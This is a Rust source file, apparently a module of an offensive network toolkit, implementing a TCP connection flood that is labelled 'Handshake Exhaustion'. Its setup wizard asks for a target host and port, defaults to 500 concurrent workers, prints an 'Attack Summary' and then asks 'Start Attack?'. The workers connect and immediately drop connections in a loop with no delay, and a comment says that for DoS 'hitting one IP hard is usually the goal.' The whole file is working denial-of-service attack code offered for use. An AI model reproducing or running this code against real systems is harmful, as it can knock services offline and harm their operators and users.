use anyhow::{Result, anyhow, Context};
use colored::*;
use tokio::io::AsyncWriteExt; // Required for stream.shutdown()

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use std::net::SocketAddr;
use tokio::net::TcpStream;
use tokio::time::Instant;
use crate::utils::{
    normalize_target, prompt_default, prompt_port, prompt_required, prompt_yes_no,
};

/// Configuration for the connection flood
#[derive(Clone, Debug)]
struct TcpFloodConfig {
    target_addr: String, // Host:Port (Display only)
    resolved_addrs: Vec<SocketAddr>, // Pre-resolved addresses
    concurrent_connections: usize,
    duration_secs: u64,
    timeout_ms: u64,
    verbose: bool,
}

/// Entry point for the module
pub async fn run(initial_target: &str) -> Result<()> {
    print_banner();
    
    let config = setup_wizard(initial_target).await?;
    execute_flood(&config).await
}

fn print_banner() {
    println!("{}", r#"
╔══════════════════════════════════════════════════════════════╗
║   TCP Connection Flood (Connect & Drop)                      ║
║   High-Performance Handshake Exhaustion                      ║
╚══════════════════════════════════════════════════════════════╝
"#.red().bold());
}

async fn setup_wizard(initial_target: &str) -> Result<TcpFloodConfig> {
    println!("{}", "=== Configuration ===".blue().bold());

    // Target
    let target_input = if initial_target.trim().is_empty() {
        prompt_required("Target Host/IP")?
    } else {
        println!("{}", format!("[*] Using target: {}", initial_target).cyan());
        initial_target.to_string()
    };
    
    // Normalize and extract details
    let normalized = normalize_target(&target_input)?;
    
    // If normalized already has port, use it, else ask
    let (host, port) = if let Some((h, p)) = normalized.split_once(':') {
        (h.to_string(), p.parse::<u16>().unwrap_or(80))
    } else {
        let p = prompt_port("Target Port", 80)?;
        (normalized, p)
    };
    
    let target_addr = format!("{}:{}", host, port);
    
    // Pre-resolve DNS
    println!("{}", format!("[*] Resolving {}...", target_addr).yellow());
    let resolved_addrs: Vec<SocketAddr> = tokio::net::lookup_host(&target_addr).await
        .context("Failed to resolve target hostname")?
        .collect();

    if resolved_addrs.is_empty() {
        return Err(anyhow!("Could not resolve target address"));
    }
    
    println!("{}", format!("[+] Resolved to: {:?}", resolved_addrs).green());

    // Concurrency
    let concurrency_input = prompt_default("Concurrent Connections", "500")?;
    let concurrent_connections: usize = concurrency_input.parse()
        .map_err(|_| anyhow!("Invalid number for concurrency"))?;
        
    if concurrent_connections == 0 {
        return Err(anyhow!("Concurrency must be > 0"));
    }

    // Duration
    let duration_input = prompt_default("Duration (seconds)", "60")?;
    let duration_secs: u64 = duration_input.parse()
        .map_err(|_| anyhow!("Invalid duration"))?;
        
    // Timeout
    let timeout_input = prompt_default("Connection Timeout (ms)", "1000")?;
    let timeout_ms: u64 = timeout_input.parse()
        .map_err(|_| anyhow!("Invalid timeout"))?;
        
    let verbose = prompt_yes_no("Verbose Output (show errors)?", false)?;

    println!("\n{}", "=== Attack Summary ===".bold());
    println!("  Target: {}", target_addr.cyan());
    println!("  IP(s): {:?}", resolved_addrs);
    println!("  Concurrency: {}", concurrent_connections);
    println!("  Duration: {}s", duration_secs);
    println!("  Mode: Connect & Drop (Handshake Stress)");
    
    if !prompt_yes_no("Start Attack?", true)? {
        return Err(anyhow!("Attack cancelled by user"));
    }

    Ok(TcpFloodConfig {
        target_addr,
        resolved_addrs,
        concurrent_connections,
        duration_secs,
        timeout_ms,
        verbose,
    })
}

async fn execute_flood(config: &TcpFloodConfig) -> Result<()> {
    println!("\n{}", "[*] Starting TCP Connection Flood...".yellow().bold());
    
    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats_established = Arc::new(AtomicU64::new(0));
    let stats_failed = Arc::new(AtomicU64::new(0));
    
    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration_secs);
    let timeout_duration = Duration::from_millis(config.timeout_ms);
    
    // Use the first resolved address for speed/simplicity
    // In a more complex version, we could round-robin, but for DoS, hitting one IP hard is usually the goal.
    let target_ip = config.resolved_addrs[0];

    // Stats Printer
    let s_stop = stop_flag.clone();
    let s_est = stats_established.clone();
    let s_fail = stats_failed.clone();
    let s_start = start_time;
    
    let stats_handle = tokio::spawn(async move {
        while !s_stop.load(Ordering::Relaxed) {
            tokio::time::sleep(Duration::from_secs(1)).await;
            let est = s_est.load(Ordering::Relaxed);
            let fail = s_fail.load(Ordering::Relaxed);
            let rate = est as f64 / s_start.elapsed().as_secs_f64();
            
            print!("\r{}", format!(
                "[*] Connected: {} | Failed: {} | Rate: {:.1} conn/s",
                est, fail, rate
            ).dimmed());
            use std::io::Write;
            let _ = std::io::stdout().flush();
        }
    });

    // Fixed Pool of Workers
    let mut handles = Vec::with_capacity(config.concurrent_connections);
    
    for _ in 0..config.concurrent_connections {
        let stop = stop_flag.clone();
        let est = stats_established.clone();
        let fail = stats_failed.clone();
        let cfg_timeout = timeout_duration;
        let verbose = config.verbose;
        let target = target_ip; // SocketAddr is Copy, so this is cheap and efficient

        let handle = tokio::spawn(async move {
            while !stop.load(Ordering::Relaxed) {
                // Try to connect using the pre-resolved IP
                // This skips DNS resolution on every attempt
                match tokio::time::timeout(cfg_timeout, TcpStream::connect(target)).await {
                    Ok(Ok(mut stream)) => {
                        // Connected! 
                        est.fetch_add(1, Ordering::Relaxed);
                        // "Connect & Drop" - Immediate shutdown sends FIN
                        let _ = stream.shutdown().await;
                    }
                    Ok(Err(e)) => {
                        // Connection failed (refused, network unreachable, etc.)
                        fail.fetch_add(1, Ordering::Relaxed);
                        if verbose && rand::random::<f32>() < 0.001 { // Lower log rate for high-speed
                             eprintln!("\n[!] Conn Error: {}", e);
                        }
                    }
                    Err(_) => {
                        // Timeout
                        fail.fetch_add(1, Ordering::Relaxed);
                    }
                }
                // No sleep - max speed
            }
        });
        handles.push(handle);
    }
    
    // Wait for duration
    tokio::time::sleep(duration).await;
    stop_flag.store(true, Ordering::Relaxed);
    
    // Return cursor to new line after stats
    println!();
    println!("{}", "[*] Stopping threads...".yellow());

    // Wait for workers to finish (graceful shutdown)
    // In a massive flood, we might not strictly wait for all if they are hung, but with timeout they should finish.
    // We can just detach them or await them. Awaiting ensures clean exit.
    for h in handles {
        let _ = h.await;
    }
    
    // Stop stats thread
    let _ = stats_handle.await;

    // Final Report
    let total_est = stats_established.load(Ordering::Relaxed);
    let total_fail = stats_failed.load(Ordering::Relaxed);
    let elapsed = start_time.elapsed().as_secs_f64();
    
    println!("\n{}", "=== Attack Complete ===".green().bold());
    println!("Target: {}", config.target_addr);
    println!("Duration: {:.2}s", elapsed);
    println!("Total Connections: {}", total_est);
    println!("Failed Attempts: {}", total_fail);
    
    if elapsed > 0.0 {
        println!("Average Rate: {:.1} conn/s", total_est as f64 / elapsed);
    }

    Ok(())
}
